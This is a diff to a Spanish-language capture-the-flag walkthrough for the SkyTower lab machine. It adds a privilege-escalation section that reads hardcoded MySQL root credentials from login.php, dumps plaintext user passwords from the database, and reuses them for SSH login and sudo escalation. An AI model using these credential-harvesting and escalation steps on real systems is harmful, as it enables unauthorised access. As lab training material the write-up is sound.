@@ -228,10 +228,65 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 <img src="https://github.com/El-Palomo/SKYTOWER/blob/main/skytower9.jpg" width=80% />
 
-Importante: Debemos añadir al final "/bin/sh" sino la conexión se cierra de inmediato.
+Importante: Debemos añadir al final "/bin/sh" sino la conexión se cierra de inmediato. (nunca supe el motivo por el cual se cierra)
 
 
 ## 5. Elevar Privilegios
+
+- Identificamos todos los usuarios del sistema operativo. Dos usuarios que no tenemos acceso SARA y WILLIAM.
+
+<img src="https://github.com/El-Palomo/SKYTOWER/blob/main/skytower9.jpg" width=80% />
+
+- Identificamos la contraseña de MYSQL. User: root y pass: root
+
+```
+cat login.php
+<?php
+
+$db = new mysqli('localhost', 'root', 'root', 'SkyTech');
+
+if($db->connect_errno > 0){
+    die('Unable to connect to database [' . $db->connect_error . ']');
+
+}
+```
+
+<img src="https://github.com/El-Palomo/SKYTOWER/blob/main/skytower10.jpg" width=80% />
+
+### 5.1. Ingresamos a la Base de Datos MYSQL
+
+
+<img src="https://github.com/El-Palomo/SKYTOWER/blob/main/skytower11.jpg" width=80% />
+
+```
+mysql -u root -p "SkyTech"
+Enter password: root
+show tables
+\q
+Tables_in_SkyTech
+login
+mysql -u root -p "SkyTech"
+Enter password: root
+select * from login
+=q
+\q
+id	email	password
+1	john@skytech.com	hereisjohn
+2	sara@skytech.com	ihatethisjob
+3	william@skytech.com	senseable
+
+Nota: para terminar la consulta añadir "\q"
+```
+
+### 5.2. Accedemos por SSH con las credenciales obtenidas
+
+- Acceder con el usuario SARA.
+- Elevamos privilegios a través de SUDO.
+
+<img src="https://github.com/El-Palomo/SKYTOWER/blob/main/skytower12.jpg" width=80% />
+
+
+<img src="https://github.com/El-Palomo/SKYTOWER/blob/main/skytower13.jpg" width=80% />
 
 
 
